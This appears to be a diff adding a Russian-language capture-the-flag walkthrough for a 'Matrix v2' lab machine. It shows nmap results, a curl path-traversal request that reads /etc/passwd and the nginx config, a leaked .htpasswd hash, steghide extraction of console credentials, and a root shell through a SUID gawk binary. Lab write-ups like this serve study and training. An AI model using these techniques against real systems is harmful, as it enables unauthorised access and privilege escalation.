@@ -1,0 +1,33 @@
+1)nmap -A  -sS -T4 192.168.226.162 -p-
+
+80/tcp    open  http               nginx 1.10.3     ///ничего интересного
+|_http-title: Welcome in Matrix v2 Neo
+|_http-server-header: nginx/1.10.3
+1337/tcp  open  ssl/http           nginx            \\\\ страница с авторизацией
+| http-auth: 
+
+12320/tcp open  ssl/http           ShellInABox    \\\ страница с консолью, не могу использовать из-за отсутствия данных для авторизации
+|_http-title: Shell In A Box
+
+
+12322/tcp open  ssl/http           nginx            \\\\уже более интересно с страницией file_view.php
+| http-robots.txt: 1 disallowed entry 
+|_file_view.php
+|_http-title: Welcome in Matrix v2 Neo
+
+2) после экспериметов с LFI на 192.168.226.162:12322/file_view.php?=
+пришли к выводу что работает с запросом POST
+  curl -X POST -k  https://192.168.226.162:12322/file_view.php -d "file=../../../../../etc/passwd"
+
+3) долго думала , что делать с этим
+  file=../../../../../etc/nginx/sites-available/default
+  показывает содержимое папки /var/www
+  обнаруживаем файл  /var/www/p4ss/.htpasswd в котром хранятся данные для входа на порт 1337
+  Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0(admin)
+
+4) полсе просмотра открывшегося сайта, видим картинку h11d3n.jpg, скачиваем и ищем скрытое содержимое
+  steghide extract -sf h1dd3n.jpg -p n30
+  в нем доступ к странице консоли на порту 12320 n30:P4$$w0rd
+
+5)дальше проще, от имени рута выполняется программа morpheus, которая на самом деле gawk
+  /usr/bin/morpheus 'BEGIN {system("/bin/sh")}'
